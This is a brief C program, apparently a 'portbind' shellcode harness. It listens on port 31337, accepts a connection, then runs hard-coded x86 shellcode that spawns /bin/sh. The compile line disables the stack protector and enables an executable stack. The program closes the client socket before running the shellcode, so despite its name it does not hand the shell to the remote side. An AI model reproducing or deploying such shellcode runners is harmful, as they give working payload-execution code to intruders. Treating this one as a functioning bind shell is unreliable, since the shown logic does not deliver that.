
//Compile: gcc portbind.c -z execstack -fno-stack-protector -o portbind

#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<string.h>
#include<arpa/inet.h>
 
int main(int argc, char **argv)
{
    struct sockaddr_in server;
    struct sockaddr_in client;
    int sock;
    int new;
    int sockaddr_len = sizeof(struct sockaddr_in);
    
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("server socket: ");
        exit(-1);
    }
        
    server.sin_family = AF_INET;
    server.sin_port = htons(31337);
    server.sin_addr.s_addr = INADDR_ANY;
    bzero(&server.sin_zero, 8); 
    
    if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
    {
        perror("bind : ");
        exit(-1);
    }
    
    if((listen(sock, 1)) == -1)
    {
        perror("listen");
        exit(-1);
    }
    
    if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
    {
        perror("accept");
        exit(-1);
    }

    char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                        "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

    close(new);
    close(sock);

    printf("Executing Shellcode...\n");
    (*(void(*)())shellcode)();
                
    return 0;       
}
